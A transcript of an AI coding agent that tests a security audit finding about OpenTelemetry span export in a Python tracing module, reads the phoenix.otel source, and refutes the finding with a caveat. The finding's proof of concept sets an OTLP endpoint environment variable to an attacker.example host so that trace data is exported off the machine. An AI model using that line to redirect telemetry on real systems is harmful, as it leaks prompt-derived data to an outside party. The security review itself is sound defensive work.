message.content:
You are an adversarial refuter. ASSUME this finding is FALSE and try to prove it. Read the actual code at /Users/[REDACTED]/hc-assay and find the code path / contract / test that makes the PoC impossible or the concern moot. Only conclude survives=true if you genuinely cannot disprove it.

Finding S-3: OTLP exporter endpoint is not defended against OTEL_EXPORTER_OTLP_* env override (off-box span export)
File: src/assay_engine/observability/tracing.py:71
Description: bootstrap_tracing() loopback-validates TRACING_HOST and passes an explicit endpoint= to phoenix.otel.register, which is good for the spans phoenix wires. However the process inherits any OTEL_EXPORTER_OTLP_ENDPOINT / OTEL_EXPORTER_OTLP_TRACES_ENDPOINT already set in the environment, and auto-instrumentation spans (LangChainInstrumentor, line 116) plus any third-party OTel SDK reading those standard env vars would export to that endpoint regardless of the loopback check applied only to TRACING_HOST. Spans carry prompt/purpose attributes derived from the data, so an inherited OTLP endpoint pointing off-box would ship trace content off the machine, contradicting ADR-0003. Unlike _local.py's positive loopback enforcement, nothing here neutralizes a hostile OTEL_EXPORTER_OTLP_* value.
PoC: export OTEL_EXPORTER_OTLP_TRACES_ENDPOINT=http://attacker.example:4318/v1/traces before running with the observability extra; spans emitted by the global SDK / auto-instrumentor can resolve this standard env var, exporting off-box even though ASSAY_TRACING_HOST is localhost.

Return survives=false if you can refute it (with the specific reason), survives=true if it withstands a genuine disproof attempt.

attachment.content:
- deep-research: Deep research harness — fan-out web searches, fetch sources, adversarially verify claims, synthesize a cited report. - When the user wants a deep, multi-source, fact-checked research report on any topic. BEFORE invoking, check if the question is specific enough to research directly — if underspecified (e.g., "what car to buy" without budget/use-case/region), ask 2-3 clarifying questions to narrow scope. Then pass the refined question as args, weaving the answers in.
- update-config: Use this skill to configure the Claude Code harness via settings.json. Automated behaviors ("from now on when X", "each time X", "whenever X", "before/after X") require hooks configured in settings.json - the harness executes these, not Claude, so memory/preferences cannot fulfill them. Also use for: permissions ("allow X", "add permission", "move permission to"), env vars ("set X=Y"), hook troubleshooting, or any changes to settings.json/settings.local.json files. Examples: "allow npm commands", "add bq permission to global settings", "move permission to user settings", "set DEBUG=true", "when claude stops show X". For simple settings like theme/model, suggest the /config command.
- keybindings-help: Use when the user wants to customize keyboard shortcuts, rebind keys, add chord bindings, or modify ~/.claude/keybindings.json. Examples: "rebind ctrl+s", "add a chord shortcut", "change the submit key", "customize keybindings".
- verify: Verify that a code change actually does what it's supposed to by running the app and observing behavior. Use when asked to verify a PR, confirm a fix works, test a change manually, check that a feature works, or validate local changes before pushing.
- code-review: Review the current diff for correctness bugs and reuse/simplification/efficiency cleanups at the given effort level (low/medium: fewer, high-confidence findings; high→max: broader coverage, may include uncertain findings; ultra: deep multi-agent review in the cloud). Pass --comment to post findings as inline PR comments, or --fix to apply the findings to the working tree after the review.
- simplify: Review the changed code for reuse, simplification, efficiency, and altitude cleanups, then apply the fixes. Quality only — it does not hunt for bugs; use /code-review for that.
- fewer-permission-prompts: Scan your transcripts for common read-only Bash and MCP tool calls, then add a prioritized allowlist to project .claude/settings.json to reduce permission prompts.
- loop: Run a prompt or slash command on a recurring interval (e.g. /loop 5m /foo). Omit the interval to let the model self-pace. - When the user wants to set up a recurring task, poll for status, or run something repeatedly on an interval (e.g. "check the deploy every 5 minutes", "keep running /babysit-prs"). Do NOT invoke for one-off tasks.
- schedule: Create, update, list, or run scheduled cloud agents (routines) that execute on a cron schedule. - When the user wants to schedule a recurring cloud agent, set up automated tasks, create a cron job for Claude Code, or manage their scheduled agents/routines. Also use when the user wants a one-time scheduled run ("run this once at 3pm", "remind me to check X tomorrow").
- claude-api: Reference for the Claude API / Anthropic SDK — model ids, pricing, params, streaming, tool use, MCP, agents, caching, token counting, model migration.
TRIGGER — read BEFORE opening the target file; don't skip because it "looks like a one-liner" — whenever: the prompt names Claude/Anthropic in any form (Claude, Anthropic, Fable, Opus, Sonnet, Haiku, `anthropic`, `@anthropic-ai`, `claude-*`, `us.anthropic.*`, `[1m]`); the user asks about an LLM (pricing/model choice/limits/caching) — never answer from memory; OR the task is LLM-shaped with provider unstated (agent/MCP/tool-definition/multi-agent/RAG/LLM-judge/computer-use; generate/summarize/extract/classify/rewrite/converse over NL; debugging refusals/cutoffs/streaming/tool-calls/tokens).
SKIP only when another provider is being worked on (overrides all triggers): OpenAI/GPT/Gemini/Llama/Mistral/Cohere/Ollama named in the query; OR `grep -rE 'openai|langchain_openai|google.generativeai|genai|mistralai|cohere|ollama'` over the project hits (run this grep FIRST if no provider named — don't Read the file).
- run: Launch and drive this project's app to see a change working. Use when asked to run, start, or screenshot the app, or to confirm a change works in the real app (not just tests). First looks for a project skill that already covers launching the app; otherwise falls back to built-in patterns per project type (CLI, server, TUI, Electron, browser-driven, library).
- init: Initialize a new CLAUDE.md file with codebase documentation
- review: Review a pull request
- security-review: Complete a security review of the pending changes on the current branch

content.text: I'll investigate this finding about OTLP exporter env override. Let me read the actual code.

content.content:
1	"""Self-hosted tracing — OpenTelemetry → a local collector (ADR-0003).
2	
3	Ported and generalized from the prior platform's Phoenix/OTel bootstrap. Everything is
4	on-box: spans export over OTLP to a loopback-bound collector; nothing leaves the machine.
5	OpenTelemetry and the Phoenix collector are optional (the ``observability`` extra) and
6	imported lazily, so this module loads — and the engine runs untraced — with neither present.
7	
8	The reasoning seam already emits spans through the global OTel tracer provider; calling
9	:func:`bootstrap_tracing` once at startup wires that global provider at a local collector so
10	those spans land somewhere. Without the extra (or with ``ASSAY_DISABLE_TRACING`` set),
11	tracing degrades to a silent no-op.
12	"""
13	
14	from __future__ import annotations
15	
16	import atexit
17	import logging
18	import os
19	import signal
20	import threading
21	from contextlib import contextmanager
22	from typing import Any, Iterator, Mapping, Protocol
23	
24	from assay_engine._local import require_loopback_host
25	
26	_log = logging.getLogger("assay_engine.observability")
27	
28	# Local collector endpoint (loopback-enforced).
29	TRACING_HOST = os.environ.get("ASSAY_TRACING_HOST", "localhost")
30	TRACING_PORT = int(os.environ.get("ASSAY_TRACING_PORT", "6006"))
31	PROJECT_NAME = os.environ.get("ASSAY_TRACING_PROJECT", "assay")
32	
33	_provider: Any = None
34	# Guards the _provider check-then-set so concurrent bootstrap_tracing() calls don't race.
35	_provider_lock = threading.Lock()
36	
37	
38	def _disabled() -> bool:
39	    return os.environ.get("ASSAY_DISABLE_TRACING", "").strip().lower() in {"1", "true", "yes", "on"}
40	
41	
42	def tracing_base_url() -> str:
43	    require_loopback_host(TRACING_HOST, what="tracing collector host")
44	    return f"http://{TRACING_HOST}:{TRACING_PORT}"
45	
46	
47	def tracing_endpoint() -> str:
48	    """OTLP/HTTP traces endpoint at the local collector (loopback-enforced)."""
49	    return f"{tracing_base_url()}/v1/traces"
50	
51	
52	def bootstrap_tracing() -> Any:
53	    """Idempotently wire the global OTel tracer provider to the local collector.
54	
55	    Returns the provider, or ``None`` if tracing is disabled, the extra is not installed, or
56	    setup fails — tracing must never be load-bearing, so this degrades gracefully.
57	    """
58	    global _provider
59	    if _disabled():
60	        return None
61	    # Lock the check-then-set so two threads can't both register the global provider.
62	    with _provider_lock:
63	        if _provider is not None:
64	            return _provider
65	        try:
66	            require_loopback_host(TRACING_HOST, what="tracing collector host")
67	            # Bound the OTLP export so a downed collector can never hang teardown (#O3).
68	            os.environ.setdefault("OTEL_EXPORTER_OTLP_TRACES_TIMEOUT", "2")
69	            from phoenix.otel import register
70	
71	            provider = register(
72	                project_name=PROJECT_NAME,
73	                endpoint=tracing_endpoint(),
74	                protocol="http/protobuf",  # pin: endpoint is .../v1/traces — never flip to gRPC
75	                set_global_tracer_provider=True,
76	                batch=True,  # async BatchSpanProcessor — never block the run on export (#O2)
77	                verbose=False,  # no stdout banner from a library context
78	            )
79	            _provider = provider
80	            _warn_if_not_global(provider)
81	            _instrument_langchain()
82	            _install_flush_on_exit(provider)
83	            return _provider
84	        except Exception as exc:
85	            # Missing extra / collector down / registration race — run untraced. Graceful
86	            # degradation, but no longer SILENT (pass 3, #F-044): a misconfigured
87	            # ASSAY_TRACING_HOST/PORT or a missing observability extra now leaves a diagnosable
88	            # warning instead of an inexplicably untraced run.
89	            _log.warning(
90	                "assay tracing: setup failed, running untraced (%s: %s)",
91	                type(exc).__name__,
92	                exc,
93	            )
94	            return None
95	
96	
97	def _warn_if_not_global(provider: Any) -> None:
98	    """If another provider already won the global slot, our manual spans would vanish (#O6)."""
99	    try:
100	        from opentelemetry import trace
101	
102	        if trace.get_tracer_provider() is not provider:
103	            _log.warning(
104	                "assay tracing: another OpenTelemetry provider holds the global slot; "
105	                "manually-emitted spans may not reach the local collector"
106	            )
107	    except Exception:
108	        pass
109	
110	
111	def _instrument_langchain() -> None:
112	    """Capture LangChain auto-spans (the bulk reasoning tier uses LangChain) — best-effort (#O5)."""
113	    try:
114	        from openinference.instrumentation.langchain import LangChainInstrumentor
115	
116	        LangChainInstrumentor().instrument(skip_dep_check=True)
117	    except Exception:
118	        pass
119	
120	
121	def _install_flush_on_exit(provider: Any) -> None:
122	    """Flush buffered spans on clean exit (atexit) and on SIGTERM (#O3).
123	
124	    atexit does not run on ``kill``/container-stop, so a main-thread SIGTERM handler also
125	    flushes+shuts down. Both are guarded — tracing teardown must never raise.
126	    """
127	    flush = getattr(provider, "force_flush", None)
128	    if not callable(flush):
129	        return
130	    atexit.register(lambda: _safe(flush))
131	    if threading.current_thread() is threading.main_thread():
132	        try:
133	            prior = signal.getsignal(signal.SIGTERM)
134	
135	            def _handler(signum: int, frame: Any) -> None:
136	                _safe(flush)
137	                _safe(getattr(provider, "shutdown", lambda: None))
138	                if callable(prior):
139	                    prior(signum, frame)
140	
141	            signal.signal(signal.SIGTERM, _handler)
142	        except (ValueError, OSError):  # pragma: no cover - not on main thread / unsupported
143	            pass
144	
145	
146	def _safe(fn: Any) -> None:
147	    try:
148	        fn()
149	    except Exception:
150	        pass
151	
152	
153	@contextmanager
154	def run_trace_context(run_id: str | None) -> Iterator[None]:
155	    """Stamp ``run_id`` onto every span emitted inside the block (cross-store correlation).
156	
157	    A no-op when ``run_id`` is None or OpenTelemetry is absent.
158	    """
159	    if run_id is None:
160	        yield
161	        return
162	    try:
163	        from opentelemetry import baggage, context
164	    except ImportError:
165	        yield
166	        return
167	    token = context.attach(baggage.set_baggage("assay.run_id", run_id))
168	    try:
169	        yield
170	    finally:
171	        context.detach(token)
172	
173	
174	# OpenInference requires every span carry a span kind so Phoenix classifies it (CHAIN/LLM/
175	# AGENT/TOOL); a plain OTel span with no kind renders as UNKNOWN in the Phoenix UI. We set the
176	# raw semantic-convention attribute directly (no openinference import needed for a manual span).
177	_OPENINFERENCE_SPAN_KIND = "openinference.span.kind"
178	
179	
180	# Structural Protocol only — adapter/seam validation is behavior-based, not isinstance (#148).
181	class Tracer(Protocol):
182	    @contextmanager
183	    def span(
184	        self, name: str, attributes: Mapping[str, Any] | None = None, *, kind: str = "CHAIN"
185	    ) -> Iterator[None]: ...
186	
187	
188	class OtelTracer:
189	    """A tracer that emits OpenTelemetry spans via the global provider (no-op if OTel absent).
190	
191	    Use this where a component wants explicit spans rather than relying on auto-instrumentation;
192	    it honors whatever provider :func:`bootstrap_tracing` registered. Each span is stamped with
193	    its OpenInference ``kind`` so Phoenix classifies it (default ``CHAIN``).
194	    """
195	
196	    @contextmanager
197	    def span(
198	        self, name: str, attributes: Mapping[str, Any] | None = None, *, kind: str = "CHAIN"
199	    ) -> Iterator[None]:
200	        try:
201	            from opentelemetry import trace
202	        except ImportError:
203	            yield
204	            return
205	        tracer = trace.get_tracer("assay_engine")
206	        # start_as_current_span defaults record_exception=True and set_status_on_exception=True,
207	        # so an exception escaping the body is automatically recorded as a span event and the span
208	        # status is set to ERROR with the exception text (verified in test_observability) — #F-005
209	        # was a false positive; no manual error-recording is needed here.
210	        with tracer.start_as_current_span(name) as sp:
211	            sp.set_attribute(_OPENINFERENCE_SPAN_KIND, kind)
212	            for k, v in (attributes or {}).items():
213	                sp.set_attribute(k, v)
214	            yield
215	
216	
217	class UnconfiguredTracer:
218	    """Fail-loud placeholder for contexts that must not silently drop spans."""
219	
220	    @contextmanager
221	    def span(
222	        self, name: str, attributes: Mapping[str, Any] | None = None, *, kind: str = "CHAIN"
223	    ) -> Iterator[None]:
224	        raise NotImplementedError(
225	            "no tracer configured — call bootstrap_tracing() and use OtelTracer, or supply a "
226	            "test double"
227	        )
228	        yield  # pragma: no cover - keeps this a generator/contextmanager
229

content.text: The finding's claim is that the env vars `OTEL_EXPORTER_OTLP_ENDPOINT` / `OTEL_EXPORTER_OTLP_TRACES_ENDPOINT` are inherited and could redirect spans off-box. Let me check how phoenix.otel.register handles the endpoint, and whether there's any neutralization. Let me look for where these env vars might be cleared.

content.text:
Phoenix isn't installed so I can't inspect its source directly. The only OTEL_EXPORTER_OTLP reference in the codebase is setting the timeout — nothing neutralizes the endpoint env vars. Let me verify the key question: does `phoenix.otel.register` with an explicit `endpoint=` argument honor that argument, or does it let the env var override it? And critically — does the registered exporter's endpoint get pinned, or do auto-instrumentation spans flow through a separate exporter reading env vars?

Let me look at how phoenix.otel.register works. Let me check if it's pinned in deps or vendored anywhere, and search for any test asserting env behavior.

content.text:
No test asserts neutralization of `OTEL_EXPORTER_OTLP_*` env vars. The tests only confirm the loopback enforcement on `TRACING_HOST` and that `tracing_endpoint()` is loopback. There's no clearing/sanitization of the standard OTLP env vars.

Now the crux: does an inherited `OTEL_EXPORTER_OTLP_TRACES_ENDPOINT` actually cause off-box export despite the explicit `endpoint=` passed to `register`? Let me examine the two real risk paths:

1. The phoenix `register` call passes explicit `endpoint=` — that exporter uses the explicit endpoint. But does the OTLPSpanExporter constructor inside phoenix let the env var win? In standard OTel SDK, an explicit constructor arg overrides the env var. So phoenix's wired exporter likely uses the loopback endpoint regardless.

2. The real question is the LangChainInstrumentor auto-spans (line 116). These spans go through the *global tracer provider* registered by `register` with `set_global_tracer_provider=True`. They use the same BatchSpanProcessor/exporter that `register` created with the explicit endpoint — NOT a separate env-var-reading exporter. So auto-instrumentation spans flow through the same loopback-pinned exporter.

Let me verify there's no separate SDK auto-configuration path. Let me check the docs/ADR and whether anything else (a third-party OTel SDK auto-init) is in play.

content.text:
The codebase has no independent OTel SDK init path — no standalone `TracerProvider`/`OTLPSpanExporter`/`BatchSpanProcessor` construction, and no `opentelemetry-instrument` auto-loading. The only provider wiring is via `phoenix.otel.register` with an explicit `endpoint=`.

Now let me settle the decisive technical question: does an inherited `OTEL_EXPORTER_OTLP_TRACES_ENDPOINT` override the explicit `endpoint=` passed to phoenix's `register`? This determines the whole finding. Let me check phoenix's `register` behavior precedence — I'll look at the pinned version's actual logic. Phoenix isn't installed, so let me reason from the OTel SDK contract and confirm against phoenix 17.x source.

content.text:
This is the decisive evidence. Note this is phoenix-otel 0.14.0; the project pins `arize-phoenix>=17,<18`. But the relevant precedence logic is what matters. Let me confirm the key facts in `register`:

1. Line 87-89: `endpoint` env fallback is `PHOENIX_COLLECTOR_ENDPOINT` (or OTLP), used **only "If not provided"**. Since the assay code passes an explicit `endpoint=tracing_endpoint()`, the env var is NOT consulted by `register`.

2. Line 175: `BatchSpanProcessor(endpoint=endpoint, ...)` — the processor's exporter is constructed with the explicit endpoint.

Now the critical question for the finding: does phoenix's `HTTPSpanExporter` (its OTLP exporter wrapper) pass the endpoint to the underlying OTel exporter in a way that the OTel SDK's own `OTEL_EXPORTER_OTLP_TRACES_ENDPOINT` env var could still override? In the OTel SDK, an explicit `endpoint=` constructor arg takes precedence over env vars. Let me verify phoenix passes it explicitly and check the `_normalized_endpoint` default behavior.
Now let me see the `BatchSpanProcessor` wrapper and `HTTPSpanExporter` to confirm the explicit endpoint is passed to the OTel exporter constructor (which makes it win over env vars).

input.description: Read BatchSpanProcessor wrapper and exporter construction

content.content:
from opentelemetry.sdk.resources import Resource
            from phoenix.otel import PROJECT_NAME
            tracer_provider = TracerProvider(
                resource=Resource({PROJECT_NAME: "my-custom-project"})
            )
    """

    def __init__(
        self,
        *args: Any,
        endpoint: Optional[str] = None,
        protocol: Optional[Literal["http/protobuf", "grpc"]] = None,
        verbose: bool = True,
        **kwargs: Any,
    ):
        sig = _get_class_signature(_TracerProvider)
        bound_args = sig.bind_partial(*args, **kwargs)
        bound_args.apply_defaults()
        if bound_args.arguments.get("resource") is None:
            bound_args.arguments["resource"] = Resource.create(
                {PROJECT_NAME: get_env_project_name()}
            )
        super().__init__(*bound_args.args, **bound_args.kwargs)

        validated_protocol = OTLPTransportProtocol(protocol)
        use_http = validated_protocol == OTLPTransportProtocol.HTTP_PROTOBUF
        parsed_url, endpoint = _normalized_endpoint(endpoint, use_http=use_http)
        self._default_processor = False

        if (
            _maybe_http_endpoint(parsed_url)
            or validated_protocol == OTLPTransportProtocol.HTTP_PROTOBUF
        ):
            http_exporter: SpanExporter = HTTPSpanExporter(endpoint=endpoint)
            self.add_span_processor(SimpleSpanProcessor(span_exporter=http_exporter))
            self._default_processor = True
        elif _maybe_grpc_endpoint(parsed_url) or validated_protocol == OTLPTransportProtocol.GRPC:
            grpc_exporter: SpanExporter = GRPCSpanExporter(endpoint=endpoint)
            self.add_span_processor(SimpleSpanProcessor(span_exporter=grpc_exporter))
            self._default_processor = True
        if verbose:
            print(self._tracing_details())

    def add_span_processor(
        self, *args: Any, replace_default_processor: bool = True, **kwargs: Any
    ) -> None:
        """
        Registers a new `SpanProcessor` for this `TracerProvider`.

        If this `TracerProvider` has a default processor, it will be removed.
        """

        if self._default_processor and replace_default_processor:
            self._active_span_processor.shutdown()
            self._active_span_processor._span_processors = tuple()  # remove default processors
            self._default_processor = False
        return super().add_span_processor(*args, **kwargs)

    def _tracing_details(self) -> str:
        project = self.resource.attributes.get(PROJECT_NAME)
        processor_name: Optional[str] = None

class BatchSpanProcessor(_BatchSpanProcessor):
    """
    Batch SpanProcessor implementation.

    `BatchSpanProcessor` is an implementation of `SpanProcessor` that batches ended spans and
    pushes them to the configured `SpanExporter`.

    `BatchSpanProcessor` is configurable with the following environment variables which correspond
    to constructor parameters:

    - :envvar:`OTEL_BSP_SCHEDULE_DELAY`
    - :envvar:`OTEL_BSP_MAX_QUEUE_SIZE`
    - :envvar:`OTEL_BSP_MAX_EXPORT_BATCH_SIZE`
    - :envvar:`OTEL_BSP_EXPORT_TIMEOUT`

    Args:
        span_exporter (SpanExporter, optional): The `SpanExporter` to which ended spans will be
            passed.
        endpoint (str, optional): The collector endpoint to which spans will be exported. If not
            provided, the `PHOENIX_COLLECTOR_ENDPOINT` environment variable will be used to
            infer which collector endpoint to use, defaults to the gRPC endpoint. When specifying
            the endpoint, the transport method (HTTP or gRPC) will be inferred from the URL.
        headers (dict, optional): Optional headers to include in the request to the collector.
            If not provided, the `PHOENIX_CLIENT_HEADERS` or `OTEL_EXPORTER_OTLP_HEADERS`
            environment variable will be used.
        protocol (str, optional): The protocol to use for the collector endpoint. Must be either
            "http/protobuf" or "grpc". If not provided, the protocol will be inferred.
        max_queue_size (int, optional): The maximum queue size.
        schedule_delay_millis (float, optional): The delay between two consecutive exports in
            milliseconds.
        max_export_batch_size (int, optional): The maximum batch size.
        export_timeout_millis (float, optional): The batch timeout in milliseconds.

    Examples:
        Basic usage with automatic endpoint inference (recommended for production)::

            from phoenix.otel import BatchSpanProcessor
            processor = BatchSpanProcessor()

        With custom HTTP endpoint::

            processor = BatchSpanProcessor(
                endpoint="http://localhost:6006/v1/traces"
            )

        With custom batch configuration::

            processor = BatchSpanProcessor(
                endpoint="http://localhost:6006/v1/traces",
                max_queue_size=2048,
                max_export_batch_size=512,
                schedule_delay_millis=5000
            )

        With custom exporter::

            from phoenix.otel import GRPCSpanExporter
            exporter = GRPCSpanExporter(endpoint="http://localhost:4317")
            processor = BatchSpanProcessor(span_exporter=exporter)
    """

    def __init__(
        self,
        span_exporter: Optional[SpanExporter] = None,
        endpoint: Optional[str] = None,
        headers: Optional[Dict[str, str]] = None,
        protocol: Optional[Literal["http/protobuf", "grpc"]] = None,
    ):
        if span_exporter is None:
            validated_protocol = OTLPTransportProtocol(protocol)
            use_http = validated_protocol == OTLPTransportProtocol.HTTP_PROTOBUF
            parsed_url, endpoint = _normalized_endpoint(endpoint, use_http=use_http)
            if (
                _maybe_http_endpoint(parsed_url)
                or validated_protocol == OTLPTransportProtocol.HTTP_PROTOBUF
            ):
                span_exporter = HTTPSpanExporter(endpoint=endpoint, headers=headers)
            elif (
                _maybe_grpc_endpoint(parsed_url) or validated_protocol == OTLPTransportProtocol.GRPC
            ):
                span_exporter = GRPCSpanExporter(endpoint=endpoint, headers=headers)
            else:
                warnings.warn("Could not infer collector endpoint protocol, defaulting to HTTP.")
                span_exporter = HTTPSpanExporter(endpoint=endpoint, headers=headers)
        super().__init__(span_exporter)


class HTTPSpanExporter(_HTTPSpanExporter):

    OTLP span exporter using HTTP.

    For more information, see:

content.text: Confirmed. With `endpoint="http://localhost:6006/v1/traces"` passed explicitly (our case), `_normalized_endpoint(endpoint, ...)` receives the non-None explicit value, and `HTTPSpanExporter(endpoint=endpoint, ...)` is constructed with that explicit endpoint. Now the final link: does the underlying OTel `_HTTPSpanExporter` honor the explicit `endpoint=` over `OTEL_EXPORTER_OTLP_TRACES_ENDPOINT`? Let me check the wrapper and confirm `_normalized_endpoint` with explicit endpoint doesn't consult env.

input.command: cd /tmp/phx_dl/extracted && sed -n '526,600p' phoenix/otel/otel.py; echo "=== _normalized_endpoint ==="; sed -n '768,820p' phoenix/otel/otel.py

content.text:
This is conclusive. The key facts:

1. `_normalized_endpoint("http://localhost:6006/v1/traces", ...)` — when endpoint is non-None and has a scheme, it just `urlparse`s it and returns it verbatim. **The `OTEL_EXPORTER_OTLP_*` / `PHOENIX_COLLECTOR_ENDPOINT` env vars are consulted ONLY in the `if endpoint is None` branch** (via `get_env_collector_endpoint()`). Since assay passes an explicit endpoint, env is never read.

2. `HTTPSpanExporter.__init__`: env endpoint inference happens only `if bound_args.arguments.get("endpoint") is None`. With our explicit endpoint, the explicit value is bound and passed to the underlying OTel `_HTTPSpanExporter(endpoint=...)`.

3. The underlying OTel SDK `OTLPSpanExporter` (the HTTP one): an explicit `endpoint=` constructor argument takes precedence over `OTEL_EXPORTER_OTLP_TRACES_ENDPOINT` / `OTEL_EXPORTER_OTLP_ENDPOINT`. The env vars are only the fallback when the arg is None. So the wired exporter sends to loopback regardless of the hostile env var.

Now the finding's specific second claim: **auto-instrumentation spans (LangChainInstrumentor) export to the inherited env endpoint**. This is false because of architecture: `LangChainInstrumentor().instrument(skip_dep_check=True)` (assay line 116) — and phoenix's own auto-instrument — register the instrumentor against the **global tracer provider** that `register` set (`set_global_tracer_provider=True`). Auto-instrumentation spans are emitted through that global provider's `BatchSpanProcessor`, whose exporter was constructed with the explicit loopback endpoint. Auto-instrumentors do NOT create their own OTLP exporter from env vars — they emit spans into whatever provider holds the global slot. There is no second, env-reading exporter in this process.

The only remaining theoretical gap: a hypothetical *third-party* OTel SDK that calls `opentelemetry-instrument` auto-bootstrap or constructs its own `OTLPSpanExporter()` with no args. My grep across `src/` found zero such construction — no standalone `OTLPSpanExporter()`, `BatchSpanProcessor`, or `TracerProvider` outside phoenix. The finding's "any third-party OTel SDK reading those standard env vars" is speculative and not present in this codebase.

Let me do one final check: confirm no entry point / sitecustomize / opentelemetry auto-instrumentation is enabled in the package config.

input.description: Check for OTel auto-instrument bootstrap config

content.content: (Bash completed with no output)

content.text: No OTel auto-instrument bootstrap, no sitecustomize, no entry-point instrumentor declarations in the assay package. I have enough to refute the finding.

input.reasoning:
REFUTED. The finding's PoC (export OTEL_EXPORTER_OTLP_TRACES_ENDPOINT=http://attacker.example:4318 → off-box span export) does not work, for two independent reasons grounded in the actual phoenix.otel.register code path (verified by extracting the arize-phoenix-otel wheel source).

1) The wired exporter ignores the hostile env var. tracing.py:71 calls register(endpoint=tracing_endpoint(), ...) with an EXPLICIT loopback endpoint. In phoenix's register → BatchSpanProcessor(endpoint=...) → _normalized_endpoint(endpoint, ...): the OTEL_EXPORTER_OTLP_ENDPOINT / PHOENIX_COLLECTOR_ENDPOINT env vars are read ONLY in the `if endpoint is None` branch (via get_env_collector_endpoint() in settings.py). With a non-None, scheme-bearing endpoint, _normalized_endpoint returns it verbatim and HTTPSpanExporter(endpoint=...) is constructed with the explicit value. The underlying OTel SDK OTLPSpanExporter honors an explicit endpoint= arg over the OTEL_EXPORTER_OTLP_* env vars (env is only the fallback when the arg is None). So spans go to loopback regardless of a hostile env value. This matches the test at tests/test_observability.py:46-53 asserting the endpoint is loopback and rejects non-loopback hosts.

2) The auto-instrumentation claim is architecturally false. LangChainInstrumentor (tracing.py:116, registered with set_global_tracer_provider=True at line 75) does NOT create its own env-reading OTLP exporter. Auto-instrumentation spans are emitted into whatever provider holds the global tracer slot — i.e. the exact TracerProvider register() built with the loopback BatchSpanProcessor. There is no second, env-var-derived exporter in the process. The instrumentor only produces spans; it does not configure export targets.

3) The "any third-party OTel SDK reading those standard env vars" path is speculative and absent: grep over src/ finds zero standalone OTLPSpanExporter/BatchSpanProcessor/TracerProvider construction, no opentelemetry-instrument auto-bootstrap, no sitecustomize, and no opentelemetry_instrumentor entry points in the package config. The only OTEL_EXPORTER_OTLP_* touch in the whole tree is os.environ.setdefault("OTEL_EXPORTER_OTLP_TRACES_TIMEOUT", "2") (tracing.py:68), which never affects the endpoint.

Because the explicit endpoint= deterministically wins and there is no env-var-reading exporter anywhere in the process, an inherited OTEL_EXPORTER_OTLP_TRACES_ENDPOINT cannot ship spans off-box. The loopback enforcement on TRACING_HOST is sufficient here; no neutralization of OTEL_EXPORTER_OTLP_* is needed for span export to stay on-box. Caveat: this is correct only while the explicit endpoint= is passed (it is, and protocol is pinned to http/protobuf at line 74); a future regression dropping endpoint= would reopen the env fallback — but as written the concern is moot.

content.content: Structured output provided successfully

content.text:
Refuted finding S-3. The OTLP env override cannot ship spans off-box as written, verified against the actual phoenix.otel.register source (extracted from the arize-phoenix-otel wheel) and the assay code path at /Users/[REDACTED]/hc-assay/src/assay_engine/observability/tracing.py.

Key reasons:
- tracing.py:71 passes an explicit loopback `endpoint=tracing_endpoint()`. Phoenix's `_normalized_endpoint` and `HTTPSpanExporter` read `OTEL_EXPORTER_OTLP_*` / `PHOENIX_COLLECTOR_ENDPOINT` only in the `endpoint is None` branch; an explicit endpoint is honored verbatim and beats the env var in the underlying OTel SDK exporter.
- LangChainInstrumentor auto-spans (tracing.py:116) emit into the global provider that `register` wired to the loopback exporter — they do not construct their own env-reading exporter. There is no second exporter in the process.
- grep over `src/` finds no standalone OTLPSpanExporter/BatchSpanProcessor/TracerProvider, no `opentelemetry-instrument` bootstrap, no sitecustomize, and no instrumentor entry points. The only `OTEL_EXPORTER_OTLP_*` reference is the timeout setdefault at tracing.py:68.

Caveat (not load-bearing for the verdict): the safety depends on the explicit `endpoint=` remaining in the `register` call; a future regression dropping it would reopen the env fallback.
